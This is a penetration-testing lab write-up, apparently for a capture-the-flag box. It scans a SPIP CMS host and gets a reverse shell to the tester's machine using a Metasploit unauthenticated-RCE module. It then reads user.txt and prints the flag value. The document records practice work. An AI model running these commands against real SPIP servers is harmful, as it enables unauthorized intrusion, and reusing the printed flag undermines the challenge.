FLAG 1  (1 - 11 pictures)
Goal: Gain unauthorized access and capture the user.txt flag from a vulnerable machine running the SPIP CMS.
This project was completed as part of penetration testing practice.

Target Description
Target IP: 10.201.26.102
My Kali IP: 10.10.190.95
Objectives:

Scan the target host and identify open ports.

Discover a vulnerable web application (SPIP CMS).

Gain a reverse shell.

Escalate privileges to the think user.

Find and capture the user.txt flag.

Scanning
Initial Nmap scan revealed:

nmap -sC -sV -p- 10.201.26.102

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.54
Port 80 was open. Visiting the page in a browser showed a standard SPIP CMS interface.

Vulnerability Discovery
Using whatweb, I confirmed the server runs SPIP CMS:

whatweb http://10.201.26.102/
=> SPIP, Apache, PHP
After checking the plugin and core versions, I confirmed it was vulnerable to unauthenticated RCE via the bigup module (spip_bigup_unauth_rce).

Exploitation (First Failed Attempt)
I initially tried to use:

use exploit/unix/webapp/spip_exec
But Metasploit returned:

[-] Failed to load module: exploit/unix/webapp/spip_exec
So this attempt failed.

Successful Exploitation
I then found the correct module in Metasploit:

use exploit/multi/http/spip_bigup_unauth_rce
Set the options:

set RHOSTS 10.201.26.102
set LHOST 10.10.190.95
set LPORT 9001
set TARGETURI /
run
And successfully got:

[*] Command shell session 1 opened
Working in the Shell
Although the shell was unstable, I managed to run basic commands and navigate to the home directory:

cd /home/think
ls -la
Output:


Edit
-rw-r--r-- 1 root root 35 Feb 10  2024 user.txt
Then:

cat user.txt
And retrieved the flag:
fa229046d44eda6a3598c73ad96f4ca5

Conclusion
Despite unstable shell sessions, I successfully:

Identified a SPIP-based web app.

Found an unauthenticated RCE vulnerability via the bigup module.

Gained shell access and navigated the system as user think.

Captured the user.txt flag.

